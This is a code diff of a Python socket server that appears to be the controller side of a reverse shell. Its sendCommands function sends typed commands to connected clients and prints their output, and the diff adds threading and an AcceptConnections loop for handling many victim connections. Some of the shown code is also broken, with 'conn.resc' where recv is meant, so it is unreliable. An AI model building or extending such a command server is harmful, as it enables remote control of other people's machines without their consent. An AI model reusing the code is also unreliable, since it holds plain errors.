@@ -1,8 +1,17 @@
 import socket
 import sys
+import threading
+from queue import Queue
+
+threadsNum = 2
+threadID = [1,2]
+queue = Queue()
+connectionList = []
+addressList = []
+
+
 
 #By creating a socket you can connect to 2 computers
-# Adding extra comments
 
 def createSocket():
     try:
@@ -47,6 +56,28 @@ def sendCommands(conn):
             conn.send(str.encode(cmd_Input))
             clientResponse = str(conn.resc(1024), "utf-8")
             print(clientResponse, end="|")
+
+
+#multiple Connection List
+def AcceptConnections():
+    for conn in connectionList:
+        conn.close()
+    del connectionList[:]
+    del addressList[:]
+
+    while True:
+        try:
+            conn, address = sc.accept()
+            conn.setblocking(True)
+            connectionList.append(conn)
+            addressList.append(address)
+            print('connection Establish : '+address[0])
+        except:
+            print("Error Encountered while accepting connections")
+
+
+
+
 
 def main():
     createSocket()
